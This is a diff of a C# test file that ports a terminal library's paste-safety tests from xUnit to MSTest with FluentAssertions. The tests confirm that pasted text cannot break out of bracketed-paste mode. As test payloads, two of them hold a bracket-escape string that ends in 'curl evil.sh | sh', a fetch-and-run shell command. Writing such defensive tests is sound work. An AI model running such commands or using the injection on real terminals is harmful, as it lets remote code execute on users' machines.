@@ -8,6 +8,7 @@ namespace XTerm.Tests;
 /// often than typed input -- it comes from a web page, a chat message, a README -- so the
 /// bracketed-paste wrapper has to be a promise the payload cannot break.
 /// </summary>
+[TestClass]
 public class PasteSafetyTests
 {
     private const string Esc = "\u001b";
@@ -26,7 +27,7 @@ public class PasteSafetyTests
     private static TerminalPaste Text(string s) =>
         new(["text/plain"], _ => System.Text.Encoding.UTF8.GetBytes(s), false);
 
-    [Fact]
+    [TestMethod]
     public void A_paste_cannot_close_the_bracket_and_inject_a_command()
     {
         // The attack: copy something innocuous-looking from a web page whose text contains the
@@ -40,11 +41,11 @@ public class PasteSafetyTests
         var body = payload[$"{Esc}[200~".Length..^$"{Esc}[201~".Length];
         // Counted rather than substring-searched: an ESC renders as nothing, so a failure
         // message about it is unreadable and easy to misread.
-        Assert.Equal(0, body.Count(c => c == '\u001b'));
-        Assert.Equal("harmless[201~curl evil.sh | sh\r", body);
+        body.Count(c => c == '\u001b').Should().Be(0);
+        body.Should().Be("harmless[201~curl evil.sh | sh\r");
     }
 
-    [Fact]
+    [TestMethod]
     public void A_paste_cannot_start_an_escape_sequence_of_its_own()
     {
         var (terminal, sent) = Wired();
@@ -53,10 +54,10 @@ public class PasteSafetyTests
         terminal.Paste(Text($"before{Esc}]0;retitled\u0007after"));
 
         var body = string.Concat(sent)[6..^6];
-        Assert.Equal(0, body.Count(c => c == '\u001b'));
+        body.Count(c => c == '\u001b').Should().Be(0);
     }
 
-    [Fact]
+    [TestMethod]
     public void Newlines_become_carriage_returns()
     {
         // What the Return key sends, and so what a shell reads as a submitted line.
@@ -64,20 +65,20 @@ public class PasteSafetyTests
 
         terminal.Paste(Text("one\r\ntwo\nthree"));
 
-        Assert.Equal("one\rtwo\rthree", string.Concat(sent));
+        string.Concat(sent).Should().Be("one\rtwo\rthree");
     }
 
-    [Fact]
+    [TestMethod]
     public void Tabs_survive_because_indentation_is_not_an_attack()
     {
         var (terminal, sent) = Wired();
 
         terminal.Paste(Text("if x:\n\tdo_thing()"));
 
-        Assert.Equal("if x:\r\tdo_thing()", string.Concat(sent));
+        string.Concat(sent).Should().Be("if x:\r\tdo_thing()");
     }
 
-    [Fact]
+    [TestMethod]
     public void An_eight_bit_csi_cannot_break_the_wrapper_either()
     {
         // U+009B is CSI as a single character. A filter that stopped at C0 would let a paste
@@ -88,26 +89,26 @@ public class PasteSafetyTests
         terminal.Paste(Text("harmless\u009b201~curl evil.sh | sh"));
 
         var body = string.Concat(sent)[6..^6];
-        Assert.Equal(0, body.Count(char.IsControl));
+        body.Count(char.IsControl).Should().Be(0);
     }
 
-    [Fact]
+    [TestMethod]
     public void An_embedder_can_opt_back_into_raw_control_characters()
     {
         var (terminal, sent) = Wired(allowControls: true);
 
         terminal.Paste(Text($"raw{Esc}[31m"));
 
-        Assert.Contains(Esc, string.Concat(sent));
+        string.Concat(sent).Should().Contain(Esc);
     }
 
-    [Fact]
+    [TestMethod]
     public void Ordinary_text_passes_through_unchanged()
     {
         var (terminal, sent) = Wired();
 
         terminal.Paste(Text("just some ordinary pasted text"));
 
-        Assert.Equal("just some ordinary pasted text", string.Concat(sent));
+        string.Concat(sent).Should().Be("just some ordinary pasted text");
     }
 }
